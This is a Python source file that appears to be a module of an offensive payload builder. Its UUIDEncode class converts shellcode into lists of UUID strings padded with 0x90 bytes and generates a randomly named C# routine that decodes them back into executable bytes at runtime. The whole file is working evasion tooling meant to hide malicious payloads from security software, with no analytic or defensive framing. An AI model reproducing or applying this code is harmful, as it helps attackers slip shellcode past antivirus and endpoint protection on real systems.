import random
import string
from uuid import UUID

class UUIDEncode:

    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return """
        public static byte[] {name}(string[] encoded)
        {{
            byte[] decoded = new byte[encoded.Length*16];
            for (int i=0; i<encoded.Length; i++){{
                Guid uuid = new Guid(encoded[i]);
                uuid.ToByteArray().CopyTo(decoded, i*16);
            }}

            for (int i=decoded.Length - 1; i > 0; i--){{
                if (decoded[i] != 0x90){{
                    byte[] output = decoded.Skip(0).Take(i+1).ToArray();
                    return output;
                }}
            }}
            return decoded;
        }}
""".format(name = self.name)
    
    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        encoded = []
        for i in range(0, len(decoded), 16):
            chunk = decoded[i:i+16]
            if len(chunk) < 16:
                chunk = chunk + (b"\x90" * (16 - len(chunk)))
            encoded.append(str(UUID(bytes_le = chunk)))
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')